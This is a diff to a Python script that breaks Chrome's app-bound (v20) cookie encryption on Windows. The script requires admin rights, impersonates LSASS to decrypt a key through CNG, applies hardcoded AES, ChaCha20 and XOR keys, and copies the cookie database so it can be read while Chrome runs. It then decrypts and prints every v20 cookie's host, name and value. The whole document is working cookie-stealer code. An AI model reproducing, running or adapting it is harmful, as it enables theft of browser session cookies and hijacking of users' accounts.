@@ -1,6 +1,6 @@
 import os
 import io
-import sys
+import shutil
 import json
 import struct
 import ctypes
@@ -8,13 +8,13 @@ import sqlite3
 import pathlib
 import binascii
 from contextlib import contextmanager
+import tempfile
 
 import windows
-import windows.security
 import windows.crypto
 import windows.generated_def as gdef
 
-from Crypto.Cipher import AES, ChaCha20_Poly1305
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
 
 def is_admin():
     try:
@@ -121,18 +121,20 @@ def byte_xor(ba1, ba2):
 def derive_v20_master_key(parsed_data: dict) -> bytes:
     if parsed_data['flag'] == 1:
         aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
-        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
+        cipher = AESGCM(aes_key)
+
     elif parsed_data['flag'] == 2:
         chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
-        cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=parsed_data['iv'])
+        cipher = ChaCha20Poly1305(chacha20_key)
+
     elif parsed_data['flag'] == 3:
         xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
         with impersonate_lsass():
             decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'])
         xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
-        cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
+        cipher = AESGCM(xored_aes_key)
 
-    return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
+    return cipher.decrypt(parsed_data['iv'], parsed_data['ciphertext'] + parsed_data['tag'], None)
 
 def main():
     # chrome data path
@@ -159,28 +161,41 @@ def main():
     parsed_data = parse_key_blob(key_blob_user_decrypted)
     v20_master_key = derive_v20_master_key(parsed_data)
 
-    # v20 key decrypt test
+    # v20 key decrypt demo
     # fetch all v20 cookies
-    con = sqlite3.connect(pathlib.Path(cookie_db_path).as_uri() + "?mode=ro", uri=True)
-    cur = con.cursor()
-    r = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) from cookies;")
-    cookies = cur.fetchall()
-    cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]
-    con.close()
+    with tempfile.TemporaryDirectory() as temp_dir:
+        temp_db_path = os.path.join(temp_dir, "TempCookies")
+        try:
+            shutil.copy2(cookie_db_path, temp_db_path)
 
-    # decrypt v20 cookie with AES256GCM
-    # [flag|iv|ciphertext|tag] encrypted_value
-    # [3bytes|12bytes|variable|16bytes]
-    def decrypt_cookie_v20(encrypted_value):
-        cookie_iv = encrypted_value[3:3+12]
-        encrypted_cookie = encrypted_value[3+12:-16]
-        cookie_tag = encrypted_value[-16:]
-        cookie_cipher = AES.new(v20_master_key, AES.MODE_GCM, nonce=cookie_iv)
-        decrypted_cookie = cookie_cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
-        return decrypted_cookie[32:].decode('utf-8')
+            con = sqlite3.connect(pathlib.Path(temp_db_path).as_uri() + "?mode=ro", uri=True)
+            cur = con.cursor()
+            r = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) from cookies;")
+            cookies = cur.fetchall()
+            cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]
+            con.close()
 
-    for c in cookies_v20:
-        print(c[0], c[1], decrypt_cookie_v20(c[2]))
+            # decrypt v20 cookie with AES256GCM
+            # [flag|iv|ciphertext|tag] encrypted_value
+            # [3bytes|12bytes|variable|16bytes]
+            
+            def decrypt_cookie_v20(cookie_cipher, encrypted_value):
+                cookie_iv = encrypted_value[3:3+12]
+                encrypted_cookie = encrypted_value[3+12:-16]
+                cookie_tag = encrypted_value[-16:]
+                decrypted_cookie = cookie_cipher.decrypt(cookie_iv, encrypted_cookie + cookie_tag, None)
+                return decrypted_cookie[32:].decode('utf-8')
+
+            cookie_cipher = AESGCM(v20_master_key)
+            for c in cookies_v20:
+                print(c[0], c[1], decrypt_cookie_v20(cookie_cipher, c[2]))
+
+        except PermissionError as e:
+                if e.winerror == 32:
+                    print("Permission denied when accessing the cookie database. This is expected if Chrome is running. Please close Chrome and try again.")
+                else:
+                    print(f"Permission error: {e}")
+
 
 if __name__ == "__main__":
     if not is_admin():
